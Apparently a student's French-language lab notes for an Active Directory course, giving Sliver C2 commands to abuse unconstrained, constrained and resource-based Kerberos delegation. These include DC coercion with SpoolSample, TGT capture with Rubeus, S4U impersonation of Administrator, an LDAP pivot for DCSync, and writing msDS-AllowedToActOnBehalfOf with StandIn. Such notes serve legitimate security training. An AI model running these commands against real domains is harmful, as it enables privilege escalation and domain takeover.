# Sliver - Delegation et RBCD

> [!summary] Objectif
> Les trois abus de délégation via Sliver : **unconstrained** (compromettre la machine + coercition du DC par SpoolSample, puis rejouer le TGT), **constrained** (Rubeus `s4u` vers les services autorisés), **RBCD** (repérer un droit d'écriture avec Get-RBCD-Threaded, puis `s4u`). Théorie : [[Attaques AD]].

> [!warning]- Required
> Unconstrained : admin local sur la machine déléguée (extraire ses secrets d'abord). Constrained : contrôle du compte autorisé à déléguer. RBCD : un droit `GenericWrite`/`GenericAll` sur l'objet computer cible.

### Unconstrained delegation + Printer Bug

```bash
# 1) Trouver une machine en unconstrained delegation
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--delegation'

# 2) Sur la machine compromise : capturer les TGT (Rubeus monitor)
execute-assembly -i -M -E -t 0 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'monitor /interval:5 /nowrap'

# 3) Forcer le DC à s'authentifier (coercition MS-RPRN)
execute-assembly -p explorer.exe -t 20 '/mnt/c/AD/Tools/Sliver/SpoolSample.exe' 'dcorp-dc.dollarcorp.moneycorp.local dcorp-appsrv.dollarcorp.moneycorp.local'
```

SpoolSample (exploit C# du Printer Bug) force `dcorp-dc` à s'authentifier vers la machine en unconstrained delegation → son TGT est capturé par Rubeus `monitor`, puis rejoué (`asktgt`/`ptt`) → accès DC. Chaîne complète avec SharpSecDump/Scshell pour l'exécution.

### Constrained delegation (Rubeus s4u)

```bash
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 's4u /user:websvc /aes256:<AES> /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt'
```

Le compte `websvc` peut déléguer vers des services précis : `s4u` (S4U2Self + S4U2Proxy) obtient un TGS **au nom d'Administrator** vers le service ciblé. `/altservice` permet de pivoter le SPN (ex. `time/dcorp-dc` → `ldap` pour du DCSync).

```bash
# Abus d'un altservice (ex. LDAP à partir d'un SPN time/)
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 's4u /user:dcorp-adminsrv$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:time/dcorp-dc /altservice:ldap /ptt'
```

### RBCD (Get-RBCD-Threaded + StandIn + Rubeus)

```bash
# 1) Repérer les objets computer où l'on a un droit d'écriture
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/Get-RBCD-Threaded.exe' '-u studentx -p <pwd> -d dollarcorp.moneycorp.local'

# 2) Écrire msDS-AllowedToActOnBehalfOf sur la cible (StandIn)
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--computer dcorp-mgmt --sid <ATTACKER_COMPUTER_SID>'

# 3) S4U depuis le compte machine contrôlé → usurper Administrator
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 's4u /user:dcorp-stdx$ /aes256:<AES> /msdsspn:cifs/dcorp-mgmt /impersonateuser:administrator /domain:dollarcorp.moneycorp.local /ptt'
```

Un simple droit d'écriture sur l'attribut `msDS-AllowedToActOnBehalfOf` de la cible suffit à s'y déclarer délégué, puis à usurper n'importe quel user (Administrator) face à cette machine.

> [!note] Après le /ptt
> Le TGS est injecté en mémoire → enchaîner avec `winrs`, `scshell` ou WMI vers la cible (voir [[Sliver - Privesc et lateral]]). Nettoyer les tickets (`klist purge` / nouvelle session) entre deux attaques pour éviter les résidus.

## Related
- [[Attaques AD]]
- [[Sliver - Kerberos et tickets]]
- [[Sliver - Privesc et lateral]]
- [[Sliver - Toutes les commandes]]
